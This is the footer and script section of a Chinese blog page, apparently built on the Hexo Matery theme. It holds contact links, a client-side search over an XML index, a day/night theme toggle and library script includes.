    <a href="tencent://AddContact/?fromId=50&fromSubId=1&subcmd=all&uin=1078240421" class="tooltipped" target="_blank" data-tooltip="QQ联系我: 1078240421" data-position="top" data-delay="50">
        <i class="fab fa-qq"></i>
    </a>







    <a href="/atom.xml" class="tooltipped" target="_blank" data-tooltip="RSS 订阅" data-position="top" data-delay="50">
        <i class="fas fa-rss"></i>
    </a>

</div>
    </div>
</footer>

<div class="progress-bar"></div>


    <!-- 搜索遮罩框 -->
<div id="searchModal" class="modal">
    <div class="modal-content">
        <div class="search-header">
            <span class="title"><i class="fas fa-search"></i>&nbsp;&nbsp;搜索</span>
            <input type="search" id="searchInput" name="s" placeholder="请输入搜索的关键字"
                   class="search-input">
        </div>
        <div id="searchResult"></div>
    </div>
</div>

<script type="text/javascript">
$(function () {
    var searchFunc = function (path, search_id, content_id) {
        'use strict';
        $.ajax({
            url: path,
            dataType: "xml",
            success: function (xmlResponse) {
                // get the contents from search data
                var datas = $("entry", xmlResponse).map(function () {
                    return {
                        title: $("title", this).text(),
                        content: $("content", this).text(),
                        url: $("url", this).text()
                    };
                }).get();
                var $input = document.getElementById(search_id);
                var $resultContent = document.getElementById(content_id);
                $input.addEventListener('input', function () {
                    var str = '<ul class=\"search-result-list\">';
                    var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
                    $resultContent.innerHTML = "";
                    if (this.value.trim().length <= 0) {
                        return;
                    }
                    // perform local searching
                    datas.forEach(function (data) {
                        var isMatch = true;
                        var data_title = data.title.trim().toLowerCase();
                        var data_content = data.content.trim().replace(/<[^>]+>/g, "").toLowerCase();
                        var data_url = data.url;
                        data_url = data_url.indexOf('/') === 0 ? data.url : '/' + data_url;
                        var index_title = -1;
                        var index_content = -1;
                        var first_occur = -1;
                        // only match artiles with not empty titles and contents
                        if (data_title !== '' && data_content !== '') {
                            keywords.forEach(function (keyword, i) {
                                index_title = data_title.indexOf(keyword);
                                index_content = data_content.indexOf(keyword);
                                if (index_title < 0 && index_content < 0) {
                                    isMatch = false;
                                } else {
                                    if (index_content < 0) {
                                        index_content = 0;
                                    }
                                    if (i === 0) {
                                        first_occur = index_content;
                                    }
                                }
                            });
                        }
                        // show search results
                        if (isMatch) {
                            str += "<li><a href='" + data_url + "' class='search-result-title'>" + data_title + "</a>";
                            var content = data.content.trim().replace(/<[^>]+>/g, "");
                            if (first_occur >= 0) {
                                // cut out 100 characters
                                var start = first_occur - 20;
                                var end = first_occur + 80;
                                if (start < 0) {
                                    start = 0;
                                }
                                if (start === 0) {
                                    end = 100;
                                }
                                if (end > content.length) {
                                    end = content.length;
                                }
                                var match_content = content.substr(start, end);
                                // highlight all keywords
                                keywords.forEach(function (keyword) {
                                    var regS = new RegExp(keyword, "gi");
                                    match_content = match_content.replace(regS, "<em class=\"search-keyword\">" + keyword + "</em>");
                                });

                                str += "<p class=\"search-result\">" + match_content + "...</p>"
                            }
                            str += "</li>";
                        }
                    });
                    str += "</ul>";
                    $resultContent.innerHTML = str;
                });
            }
        });
    };

    searchFunc('/search.xml', 'searchInput', 'searchResult');
});
</script>

    <!-- 回到顶部按钮 -->
<div id="backTop" class="top-scroll">
    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
        <i class="fas fa-arrow-up"></i>
    </a>
</div>

    <!-- 白天和黑夜主题 -->
<div class="sum-moon-box">
  <a class="btn-floating btn-large waves-effect waves-light" onclick="switchNightMode()" title="切换主题" >
    <i id="sum-moon-icon" class="fas fa-sun" style="width:48px; height:48px; font-size: 28px;"></i>
  </a>
</div>

<script>
  function switchNightMode() {
    $('<div class="Cuteen_DarkSky"><div class="Cuteen_DarkPlanet"></div></div>').appendTo($('body')),
      setTimeout(function () {
        $('body').hasClass('DarkMode') 
        ? ($('body').removeClass('DarkMode'), localStorage.setItem('isDark', '1'), $('#sum-moon-icon').removeClass("fa-sun").addClass('fa-moon')) 
        : ($('body').addClass('DarkMode'), localStorage.setItem('isDark', '0'), $('#sum-moon-icon').addClass("fa-sun").removeClass('fa-moon')),
          
        setTimeout(function () {
          $('.Cuteen_DarkSky').fadeOut(1e3, function () {
            $(this).remove()
          })
        }, 2e3)
      })
  }
</script>

    <script>
    //模式判断 
    if (localStorage.getItem('isDark') === '0') {
        document.body.classList.add('DarkMode');
        $('#sum-moon-icon').addClass("fa-sun").removeClass('fa-moon')
    } else {
        document.body.classList.remove('DarkMode');
        $('#sum-moon-icon').removeleClass("fa-sun").addClass('fa-moon')
    }
    </script>

    <script src="/libs/materialize/materialize.min.js"></script>
    <script src="/libs/masonry/masonry.pkgd.min.js"></script>
    <script src="/libs/aos/aos.js"></script>
    <script src="/libs/scrollprogress/scrollProgress.min.js"></script>
    <script src="/libs/lightGallery/js/lightgallery-all.min.js"></script>
    <script src="/js/matery.js"></script>

    

    

    <!-- 雪花特效 -->
    

    <!-- 鼠标星星特效 -->
    

     
        <script src="https://ssl.captcha.qq.com/TCaptcha.js"></script>
        <script src="/libs/others/TencentCaptcha.js"></script>
        <button id="TencentCaptcha" data-appid="xxxxxxxxxx" data-cbfn="callback" type="button" hidden></button>
    

    <!-- Baidu Analytics -->

    <!-- Baidu Push -->

    
    
    <script async src="/libs/others/busuanzi.pure.mini.js"></script>
    

    

    

    <!--腾讯兔小巢-->
    
    

    

    

    
    <script src="/libs/instantpage/instantpage.js" type="module"></script>
    

</body>

</html>
